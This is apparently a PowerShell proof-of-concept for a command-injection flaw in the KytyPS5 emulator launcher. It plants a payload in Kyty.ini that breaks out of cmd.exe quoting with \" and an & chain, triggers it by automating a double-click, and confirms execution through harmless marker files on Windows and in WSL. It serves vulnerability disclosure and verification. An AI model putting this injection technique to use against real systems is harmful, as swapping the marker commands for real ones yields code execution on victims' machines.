# CVE-1 proof of concept - KytyPS5 launcher cmd.exe /K command injection.
#
# AV-SAFE BY DESIGN: the payload only creates two marker files.
#   1. C:\Users\Public\cve1_poc.txt   - written by cmd.exe as the logged-in user
#   2. /tmp/cve1_rce_proof            - created INSIDE WSL via wsl.exe
# No network access, no encoded commands, no downloads: nothing for
# behaviour-based antivirus to flag. (Windows Defender may still flag the
# official emulator binaries themselves - that is unrelated to this bug.)
#
# Flow exercised (same chain as the full write-up):
#   Kyty.ini [GlobalConfiguration] shader_log_folder = <payload>
#   -> launcher reads config -> user double-clicks the game row
#   -> MainDialog::RunInterpreter -> BuildWinCmdKCommand + WinCmdQuote
#   -> QProcess(cmd.exe, nativeArguments = "/K \"" ... )
#   -> cmd.exe parses the injected "& ... &" chain and runs our command
#      BEFORE kyty_emulator.exe starts.
#
# The payload MUST contain \" (backslash-quote) in the INI file:
# QSettings unescapes \" to a real ", then WinCmdQuote re-escapes it to \",
# which is what cmd.exe needs so quote-state toggles OFF before the &.
param(
    [string]$Payload   = 'x\"&echo CVE1-PROOF>C:/Users/Public/cve1_poc.txt&wsl touch /tmp/cve1_rce_proof&rem \"',
    [string]$MarkerPath = 'C:\Users\Public\cve1_poc.txt',
    [string]$WslMarker  = '/tmp/cve1_rce_proof',
    [string]$Ini        = 'C:\ProgramData\Kyty\Kyty.ini',
    [string]$LaunchDir  = '',
    [string]$RowMatch   = '*Fake*',
    [switch]$KeepConfig,
    [switch]$RemoveMarkers
)
Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

if (-not $LaunchDir) {
    $LaunchDir = Join-Path $PSScriptRoot '..\cve-1-poc\release\win'
}
$LaunchDir = [System.IO.Path]::GetFullPath($LaunchDir)
$launcher = Join-Path $LaunchDir 'launcher.exe'

Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class G {
  [DllImport("user32.dll",CharSet=CharSet.Auto)]
  public static extern IntPtr SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);
  [DllImport("user32.dll")] public static extern bool SetCursorPos(int X,int Y);
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int c);
  [DllImport("user32.dll")] public static extern bool IsIconic(IntPtr h);
  [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr h,out RECT r);
  [DllImport("user32.dll")] public static extern bool ScreenToClient(IntPtr h,ref POINT p);
  public struct RECT { public int L,T,Rt,B; }
  public struct POINT { public int X,Y; }
  public static IntPtr LPACK(int x,int y){ return (IntPtr)((y<<16)|(x&0xFFFF)); }
}
'@
function Log($m){ Write-Host ("[{0:HH:mm:ss.fff}] {1}" -f (Get-Date), $m) -ForegroundColor Cyan }

if (-not (Test-Path -LiteralPath $launcher)) { throw "launcher.exe not found: $launcher (pass -LaunchDir)" }
if (-not (Test-Path -LiteralPath $Ini))      { throw "Kyty.ini not found: $Ini (start the launcher once and close it)" }

# ---- 0. stop anything that could overwrite the config on exit -----------------
Get-Process -Name launcher,kyty_emulator -ErrorAction SilentlyContinue | Stop-Process -Force
Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -eq 'cmd.exe' -and $_.CommandLine -like '*kyty_emulator*' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Start-Sleep -Seconds 2

# ---- 1. persist the payload exactly where Configuration::WriteSettings would --
$lines = @(Get-Content -LiteralPath $Ini)
$line  = 'shader_log_folder=' + $Payload
$done  = $false
for($i = 0; $i -lt $lines.Count; $i++){
  if($lines[$i] -like 'shader_log_folder=*'){ $lines[$i] = $line; $done = $true; break }
}
if(-not $done){
  for($i = 0; $i -lt $lines.Count; $i++){
    if($lines[$i] -eq '[GlobalConfiguration]'){
      $tmp = New-Object System.Collections.ArrayList
      foreach($l in $lines[0..$i]){ [void]$tmp.Add($l) }
      [void]$tmp.Add($line)
      foreach($l in $lines[($i+1)..($lines.Count-1)]){ [void]$tmp.Add($l) }
      $lines = $tmp.ToArray(); $done = $true; break
    }
  }
}
if(-not $done){ throw 'shader_log_folder key not found in Kyty.ini' }
Set-Content -LiteralPath $Ini -Value $lines -Encoding ASCII
$chk = Select-String -LiteralPath $Ini -Pattern '^shader_log_folder='
if(-not $chk){ throw 'failed to persist payload into Kyty.ini' }
Log 'payload written to Kyty.ini [GlobalConfiguration]:'
$chk | ForEach-Object { Write-Host ('    ' + $_.Line) -ForegroundColor DarkGray }

if(Test-Path -LiteralPath $MarkerPath){ Remove-Item -LiteralPath $MarkerPath -Force }
& wsl.exe -e rm -f $WslMarker 2>$null

# ---- 2. launch the real release binary (retry: Defender can block once) ------
$proc = $null
for($a = 1; $a -le 3 -and -not $proc; $a++){
  try{
    $proc = Start-Process -FilePath $launcher -WorkingDirectory $LaunchDir -PassThru -ErrorAction Stop
  }catch{
    Log "Start-Process attempt $a failed: $($_.Exception.Message)"
    if($a -lt 3){ Start-Sleep -Seconds 5 }
  }
}
if(-not $proc){ throw 'could not start launcher.exe (Defender blocked it? check Protection history)' }
Start-Sleep -Seconds 12
$LP = $proc.Id
$proc.Refresh()
if($proc.MainWindowHandle -eq [IntPtr]::Zero){ throw 'launcher has no main window' }
$HW = $proc.MainWindowHandle
Log "launcher PID=$LP hwnd=$HW"
if([G]::IsIconic($HW)){ [G]::ShowWindow($HW,9) | Out-Null }
$rc = New-Object G+RECT; [G]::GetWindowRect($HW,[ref]$rc) | Out-Null
Log "rect=($($rc.L),$($rc.T))-($($rc.Rt),$($rc.B))"

# ---- 3. select the game row (Run() uses GetSelectedItem()) --------------------
$root = [System.Windows.Automation.AutomationElement]::RootElement
$pcond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::ProcessIdProperty,$LP)
$w = $null; $t = Get-Date
while(((Get-Date)-$t).TotalSeconds -lt 30 -and -not $w){
  try{ $w = $root.FindFirst([System.Windows.Automation.TreeScope]::Children,$pcond) }catch{}
  if(-not $w){ Start-Sleep -Milliseconds 400 }
}
if(-not $w){ throw 'main window not found via UIA' }
$a = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::AutomationIdProperty,'QApplication.MainDialog.widget.cfgs_list')
$tree = $null; $t = Get-Date
while(((Get-Date)-$t).TotalSeconds -lt 30 -and -not $tree){
  try{ $tree = $w.FindFirst([System.Windows.Automation.TreeScope]::Descendants,$a) }catch{}
  if(-not $tree){ Start-Sleep -Milliseconds 400 }
}
if(-not $tree){ throw 'game tree not found' }
$wk = [System.Windows.Automation.TreeWalker]::ControlViewWalker
$row = $null; $it = $wk.GetFirstChild($tree)
while($it){
  if($it.Current.Name -like $RowMatch){ $row = $it; break }
  $it = $wk.GetNextSibling($it)
}
if(-not $row){ throw "game row matching '$RowMatch' not found" }
Log "row: '$($row.Current.Name)'"
$row.GetCurrentPattern([System.Windows.Automation.SelectionItemPattern]::Pattern).Select()
Start-Sleep -Milliseconds 800

# ---- 4. trigger Run(): double-click row via WM_LBUTTON* into launcher HWND ----
$found = $null
for($att = 1; $att -le 6 -and -not $found; $att++){
  $pat = $row.GetCurrentPattern([System.Windows.Automation.SelectionItemPattern]::Pattern)
  $pat.Select()
  Start-Sleep -Milliseconds 600
  $r = $row.Current.BoundingRectangle
  $sx = [int]($r.X + $r.Width/2); $sy = [int]($r.Y + $r.Height/2)
  $pt = New-Object G+POINT; $pt.X = $sx; $pt.Y = $sy
  [G]::ScreenToClient($HW,[ref]$pt) | Out-Null
  [G]::SetCursorPos($sx,$sy) | Out-Null
  Start-Sleep -Milliseconds 250

  $MKL = [IntPtr]1; $Z = [IntPtr]::Zero
  $ptL = [G]::LPACK($pt.X,$pt.Y)
  [G]::SendMessage($HW,0x0200,$Z,   $ptL) | Out-Null   # WM_MOUSEMOVE
  [G]::SendMessage($HW,0x0201,$MKL, $ptL) | Out-Null   # WM_LBUTTONDOWN
  [G]::SendMessage($HW,0x0202,$Z,   $ptL) | Out-Null   # WM_LBUTTONUP
  Start-Sleep -Milliseconds 200
  [G]::SendMessage($HW,0x0201,$MKL, $ptL) | Out-Null   # WM_LBUTTONDOWN
  [G]::SendMessage($HW,0x0203,$MKL, $ptL) | Out-Null   # WM_LBUTTONDBLCLK
  [G]::SendMessage($HW,0x0202,$Z,   $ptL) | Out-Null   # WM_LBUTTONUP
  Log "attempt $att : WM_LBUTTON* sent to client($($pt.X),$($pt.Y)) of hwnd=$HW"

  $d = (Get-Date).AddSeconds(8)
  while((Get-Date) -lt $d){
    try{
      $found = Get-CimInstance Win32_Process -ErrorAction Stop |
                 Where-Object { $_.Name -eq 'cmd.exe' -and $_.ParentProcessId -eq $LP -and $_.CommandLine -like '*/K*' } |
                 Select-Object -First 1
    }catch{}
    if($found){ break }
    Start-Sleep -Milliseconds 350
  }
}

# ---- 5. verify both markers ---------------------------------------------------
$winOk = $false; $wslOk = $false
$d = (Get-Date).AddSeconds(30)
while((Get-Date) -lt $d -and -not ($winOk -and $wslOk)){
  if(-not $winOk -and (Test-Path -LiteralPath $MarkerPath)){ $winOk = $true }
  if(-not $wslOk){
    & wsl.exe -e test -f $WslMarker 2>$null
    if($LASTEXITCODE -eq 0){ $wslOk = $true }
  }
  if(-not ($winOk -and $wslOk)){ Start-Sleep -Milliseconds 500 }
}

Write-Host ''
Write-Host '=================== CVE-1 PoC RESULT ===================' -ForegroundColor Yellow
if($found){
  Write-Host "launcher PID    : $LP" -ForegroundColor Yellow
  Write-Host "cmd.exe PID     : $($found.ProcessId)  (parent $($found.ParentProcessId))" -ForegroundColor Yellow
  Write-Host 'cmd.exe command line:' -ForegroundColor DarkYellow
  Write-Host $found.CommandLine
}
if($winOk){
  Write-Host "[+] MARKER 1 (Windows): $MarkerPath" -ForegroundColor Green
  Write-Host "    content: $((Get-Content -LiteralPath $MarkerPath -Raw).Trim())" -ForegroundColor Green
} else {
  Write-Host "[-] marker 1 missing: $MarkerPath" -ForegroundColor Red
}
if($wslOk){
  Write-Host "[+] MARKER 2 (WSL): $WslMarker exists inside the Linux distro" -ForegroundColor Green
} else {
  Write-Host "[-] marker 2 missing in WSL: $WslMarker" -ForegroundColor Red
}

# ---- 6. restore config, stop processes ---------------------------------------
if(-not $KeepConfig){
  $lines2 = @(Get-Content -LiteralPath $Ini)
  for($i = 0; $i -lt $lines2.Count; $i++){
    if($lines2[$i] -like 'shader_log_folder=*'){ $lines2[$i] = 'shader_log_folder=_Shaders' }
  }
  Set-Content -LiteralPath $Ini -Value $lines2 -Encoding ASCII
  Log 'Kyty.ini restored: shader_log_folder=_Shaders'
}
Get-Process -Name launcher,kyty_emulator -ErrorAction SilentlyContinue | Stop-Process -Force
Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -eq 'cmd.exe' -and $_.CommandLine -like '*kyty_emulator*' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
if($RemoveMarkers){
  if(Test-Path -LiteralPath $MarkerPath){ Remove-Item -LiteralPath $MarkerPath -Force }
  & wsl.exe -e rm -f $WslMarker 2>$null
  Log 'markers removed'
}

if($winOk -and $wslOk){ Write-Host '[+] RCE CONFIRMED (user-level, Windows + WSL)' -ForegroundColor Green; exit 0 }
if($winOk){ Write-Host '[+] RCE CONFIRMED on Windows (WSL part failed - is wsl.exe installed?)' -ForegroundColor Green; exit 0 }
exit 1
